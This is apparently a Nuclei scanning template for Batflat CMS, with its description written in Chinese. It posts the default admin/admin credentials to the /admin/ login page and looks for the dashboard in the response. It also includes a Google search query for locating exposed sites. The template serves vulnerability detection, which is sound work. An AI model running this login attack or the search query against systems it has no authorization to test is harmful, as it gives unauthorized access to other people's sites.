id: batflat-default-login

info:
  name: Batflat CMS 默认口令登录（弱口令）
  author: r3Y3r53
  severity: high
  description: |
    该模板通过尝试 Batflat CMS 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://www.exploitalert.com/view-details.html?id=34749
    - https://cxsecurity.com/issue/WLB-2020010100
  classification:
    cpe: cpe:2.3:a:batflat:batflat:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: batflat
    product: batflat
    google-query: intext:"Powered by Batflat."
  tags: default-login,batflat,vuln

http:
  - raw:
      - |
        POST /admin/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}&login=

    attack: pitchfork
    payloads:
      username:
        - "admin"
      password:
        - "admin"
    host-redirects: true
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
          - 'contains(body, "Batflat - Dashboard")'
        condition: and
